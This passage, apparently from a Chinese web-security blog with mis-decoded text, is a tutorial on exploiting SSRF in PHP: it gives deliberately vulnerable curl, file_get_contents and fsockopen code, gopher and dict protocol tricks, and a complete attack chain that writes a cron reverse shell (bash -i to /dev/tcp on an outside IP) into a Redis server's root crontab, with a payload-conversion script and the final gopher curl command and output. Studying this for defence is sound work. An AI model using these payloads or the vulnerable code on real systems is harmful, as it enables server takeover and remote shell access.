<h3 id="TODO-v4">TODO</h3>
<h2 id="RCTF-2019-Nextphp">[RCTF 2019]Nextphp</h2>
<h3 id="TODO-v5">TODO</h3>
<h2 id="De1CTF-2019-ShellShellShell">[De1CTF 2019]ShellShellShell</h2>
<h3 id="TODO-v6">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹SSRFæ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹SSRFæ¼æ´åˆ©ç”¨">Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹SSRFæ¼æ´åˆ©ç”¨</h1>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191206123722.png" alt=""></p>
<h2 id="ä»€ä¹ˆæ˜¯ssrf">ä»€ä¹ˆæ˜¯ssrf</h2>
<p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p>
<p>ç®€å•æ¥è®²å°±æ˜¯ï¼ŒæœåŠ¡å™¨ä¼šå“åº”ç”¨æˆ·çš„urlè¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰åšå¥½è¿‡æ»¤å’Œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥æ”»å‡»å†…ç½‘ã€‚</p>
<h2 id="æ¼æ´äº§ç”Ÿ">æ¼æ´äº§ç”Ÿ</h2>
<p>ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç”¨æˆ·å¯æ§çš„ç›®æ ‡åœ°å€åšè¿‡è™‘ä¸é™åˆ¶ã€‚</p>
<p>åœ¨PHPä¸­çš„curl()ï¼Œfile_get_contents()ï¼Œfsockopen()ç­‰å‡½æ•°æ˜¯å‡ ä¸ªä¸»è¦äº§ç”Ÿssrfæ¼æ´çš„å‡½æ•°ã€‚</p>
<h3 id="file-get-contents">file_get_contents()</h3>
<p>file_get_contentsæ˜¯æŠŠæ–‡ä»¶å†™å…¥å­—ç¬¦ä¸²ï¼Œå½“æŠŠurlæ˜¯å†…ç½‘æ–‡ä»¶çš„æ—¶å€™ï¼Œä»–ä¼šå…ˆå»æŠŠè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»å‡ºæ¥å†å†™å…¥ï¼Œå¯¼è‡´äº†æ–‡ä»¶è¯»å–ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $content=file_get_contents($_POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    $filename=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    file_put_contents($filename,$content);</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $img=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.$filename.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="fsockopen">fsockopen()</h3>
<p><code>fsockopen()</code>å‡½æ•°æœ¬èº«å°±æ˜¯æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…Unixå¥—æ¥å­—è¿æ¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$fp = fsockopen(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="curl">curl()</h3>
<p>è¿™åº”è¯¥æ˜¯å¤§å®¶æœ€ç†Ÿæ‚‰çš„ä¸€ä¸ªå‡½æ•°äº†ï¼Œå› ä¸ºåˆ©ç”¨æ–¹å¼å¾ˆå¤šæœ€å¸¸è§çš„æ˜¯é€šè¿‡fileã€dictã€gopherè¿™ä¸‰ä¸ªåè®®æ¥è¿›è¡Œæ¸—é€ï¼Œæ¥ä¸‹æ¥ä¹Ÿä¸»è¦æ˜¯é›†ä¸­è®²å¯¹äº<code>curl()</code>å‡½æ•°çš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<blockquote>
<p>è¿™é‡Œä¸€å®šè¦å®‰è£…PHPçš„curlæ‰©å±•ï¼ï¼ï¼Windowsç¯å¢ƒä¸‹php-studyç”¨å¤šäº†ï¼Œåˆ°äº†Linuxç¯å¢ƒéƒ½ä¸çŸ¥é“æ€ä¹ˆæ­ç¯å¢ƒäº†ã€‚ï¼ˆæŠ˜è…¾äº†ä¸€ä¸‹åˆå‘ç°æ²¡æœ‰å®‰è£…php-curlâ€¦==ï¼‰<a href="https://segmentfault.com/a/1190000009068818">https://segmentfault.com/a/1190000009068818</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url); </span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢å°±è¯¦ç»†è®²ä¸€ä¸‹curlå‡½æ•°åœ¨ssrfä¸­çš„å…·ä½“åˆ©ç”¨æ–¹å¼ã€‚</p>
<h2 id="åˆ©ç”¨æ–¹å¼">åˆ©ç”¨æ–¹å¼</h2>
<h3 id="ä¸€äº›åè®®çš„ç†è§£">ä¸€äº›åè®®çš„ç†è§£</h3>
<p>åœ¨è®²åˆ©ç”¨æ–¹å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹curlå‘½ä»¤æ”¯æŒå“ªäº›ç½‘ç»œåè®®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:/var/www/html/ssrf<span class="comment"># curl -V</span></span><br><span class="line">url 7.66.0 (x86_64-pc-linux-gnu) libcurl/7.66.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.39.2 librtmp/2.3</span><br><span class="line">Release-Date: 2019-09-11</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp </span><br><span class="line">Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¯¥ç‰ˆæœ¬çš„curlæ”¯æŒå¾ˆå¤šåè®®ï¼Œå…¶ä¸­gopheråè®®ã€dictåè®®ã€fileåè®®ã€http/såè®®ç”¨çš„æ¯”è¾ƒå¤šã€‚</p>
<h4 id="gopher">gopher</h4>
<p><a href="https://zh.wikipedia.org/wiki/Gopher_(%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)">Gopher wiki</a></p>
<p>äº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®ï¼Œå‡ºç°åœ¨httpåè®®ä¹‹å‰ã€‚ï¼ˆå¯ä»¥æ¨¡æ‹ŸGET/POSTè¯·æ±‚ï¼Œæ¢è¡Œä½¿ç”¨%0d%0aï¼Œç©ºç™½è¡Œ%0aï¼‰ã€‚</p>
<p>gopheråè®®çš„æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</span><br></pre></td></tr></table></figure>
<p>gopheråè®®åœ¨curlå‘½ä»¤ä¸­çš„ä½¿ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://localhost:2222/hello%0agopher</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208095637.png" alt=""></p>
<p>é€šè¿‡ncå›æ˜¾å¯ä»¥å‘ç°ï¼Œæ•°æ®æ¢è¡Œäº†ï¼Œ ç„¶è€Œ hello åªå›æ˜¾äº† ello ï¼Œä¹Ÿå°±æ˜¯è¯´ h â€œè¢«åƒäº†â€, å› æ­¤è¦åœ¨ä¼ è¾“çš„æ•°æ®å‰åŠ ä¸€ä¸ªæ— ç”¨å­—ç¬¦ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://localhost:2222/_hello%0agopher</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å¦‚æœæ˜¯åœ¨åœ°å€æ åˆ©ç”¨payloadæ—¶ï¼Œéœ€è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.130&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;localhost:2222&#x2F;_hello%250agopher</span><br></pre></td></tr></table></figure>
</blockquote>
<p>å†åˆ©ç”¨ssrf.phpï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726</span><br><span class="line"> </span><br><span class="line">[root@ca01h html]<span class="comment"># curl -v &#x27;http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test&#x27;</span></span><br><span class="line"> </span><br><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726.</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="dict">dict</h4>
<p>å­—å…¸æœåŠ¡å™¨åè®®ã€‚dictæ˜¯åŸºäºæŸ¥è¯¢ç›¸åº”çš„TCPåè®®ã€‚æœåŠ¡å™¨ç›‘å¬ç«¯å£2628ã€‚æ¼æ´ä»£ç æ²¡æœ‰å±è”½å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨dictåè®®è·å–sshç­‰æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ã€‚</p>
<p>å› ä¸ºssrf.phpçš„æ¼æ´ä»£ç æœ‰å›æ˜¾ï¼Œæ‰€ä»¥curlå‘½ä»¤ç›´æ¥è®¿é—®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å³å¯çœ‹åˆ°redisçš„ç›¸å…³é…ç½®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:22/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å³å¯çœ‹åˆ°sshçš„bannerä¿¡æ¯ã€‚</p>
<p>å¦‚æœssrf.phpä¸­åŠ ä¸Šä¸€è¡Œå±è”½å›æ˜¾çš„ä»£ç <code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>ï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼å°±å¤±æ•ˆäº†ï¼Œå’Œgopherä¸€æ ·ï¼Œåªèƒ½åˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œåå¼¹ä¼ è¾“æ•°æ®äº†ã€‚</p>
<h4 id="file">file</h4>
<p>æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®ï¼Œä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ã€‚</p>
<p>å› ä¸ºssrf.phpçš„æ¼æ´ä»£ç æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æµè§ˆå™¨ç›´æ¥è®¿é—®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208104710.png" alt=""></p>
<h4 id="http-s">http/s</h4>
<p>ä¸»è¦ç”¨æ¥æ¢æµ‹å†…ç½‘æœåŠ¡ã€‚æ ¹æ®å“åº”çš„çŠ¶æ€åˆ¤æ–­å†…ç½‘ç«¯å£åŠæœåŠ¡ï¼Œå¯ä»¥ç»“åˆjavaç³»åˆ—0dayå’Œå…¶ä»–å„ç§0dayä½¿ç”¨ã€‚</p>
<h3 id="æ”»å‡»Redis">æ”»å‡»Redis</h3>
<blockquote>
<p>ç›®æ ‡ï¼šé˜¿é‡Œäº‘æœåŠ¡å™¨ Centos7 IPï¼š47.97.199.89</p>
<p>æ”»å‡»ï¼šåä¸ºäº‘æœåŠ¡å™¨ Centos7 IPï¼š121.36.45.17</p>
<p>å…·ä½“ç¯å¢ƒæ­å»ºè¯·è½¬åˆ°æ–‡ç« æœ«å°¾çš„Appendix Bã€‚</p>
</blockquote>
<h4 id="Redisåå¼¹Shellï¼ˆrootæƒé™ï¼‰">Redisåå¼¹Shellï¼ˆrootæƒé™ï¼‰</h4>
<blockquote>
<p>ä»€ä¹ˆæ˜¯åå¼¹Shellï¼š<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
</blockquote>
<p>å…ˆå†™ä¸€ä¸ªredisåå¼¹shellçš„bashè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shell.sh</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨redisçš„ç¬¬0ä¸ªæ•°æ®åº“ä¸­æ·»åŠ keyä¸º1ï¼Œvalueä¸º\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n\nçš„å­—æ®µã€‚æœ€åä¼šå¤šå‡ºä¸€ä¸ªnæ˜¯å› ä¸ºechoé‡å®šå‘æœ€åä¼šè‡ªå¸¦ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚<code>CONFIG SET</code> å‘½ä»¤åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®ï¼Œæ¯ä¸ªç”¨æˆ·ç”Ÿæˆçš„crontabæ–‡ä»¶ï¼Œéƒ½ä¼šæ”¾åœ¨ /var/spool/cron/ ç›®å½•ä¸‹é¢ï¼Œ<code>set</code>ç›´æ¥å¾€å½“å‰ç”¨æˆ·çš„crontabé‡Œå†™å…¥åå¼¹shellã€‚</p>
<p>æƒ³è·å–Redisæ”»å‡»çš„TCPæ•°æ®åŒ…ï¼Œå¯ä»¥ä½¿ç”¨socatè¿›è¡Œç«¯å£è½¬å‘ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br><span class="line">bash shell.sh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ„æ€æ˜¯å°†æœ¬æœºçš„4444ç«¯å£è½¬å‘åˆ°æœ¬æœºçš„6379ç«¯å£ã€‚è®¿é—®è¯¥æœåŠ¡å™¨çš„4444ç«¯å£ï¼Œè®¿é—®çš„å…¶å®æ˜¯è¯¥æœåŠ¡å™¨çš„6379ç«¯å£ã€‚æ•è·åˆ°æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.167534  length&#x3D;89 from&#x3D;0 to&#x3D;88</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$62\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.167814  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.171555  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.171779  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.175397  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.175619  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.179000  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.185711  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.189649  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.189817  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>&gt;</code>æˆ–è€…<code>&lt; </code>é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚</li>
<li>å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯<code>+OK</code> é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚</li>
<li>å°†<code>\r</code>å­—ç¬¦ä¸²æ›¿æ¢æˆ<code>%0d%0a</code></li>
<li>ç©ºç™½è¡Œæ›¿æ¢ä¸º<code>%0a</code></li>
</ul>
<p>è½¬æ¢è„šæœ¬ï¼š<code>tran2gopher.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python tran2gopher.py socat.log</span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">1</span>] <span class="keyword">in</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                exp = exp + line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line">exp.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;%24&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;%3C&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;%3E&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;%3F&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç»“æœä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨æ”»å‡»æ–¹æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;gopher://47.97.199.89</span></span><br><span class="line"><span class="string">:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.179/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‡ºç°5ä¸ªokï¼Œåˆ™æˆåŠŸäº†å†™å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Trying 47.97.199.89:6379...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 47.97.199.89 (47.97.199.89) port 6379 (#0)</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">* Closing connection 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é‚£å†æ£€æµ‹ä»¥ä¸‹Rediså†™å…¥çš„å­—æ®µå’Œcrontabçš„å†…å®¹ã€‚</p>
<ul>
<li>æ£€æµ‹Redisæ•°æ®åº“çš„å­—æ®µä¸º<code>&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n\n&quot;</code></li>
<li>æ£€æµ‹crontabçš„å†…å®¹ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</li>
</ul>
<p>æœ€ååœ¨ç›®æ ‡æœºä¸Šç›‘å¬ç«¯å£2333ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br></pre></td></tr></table></figure>
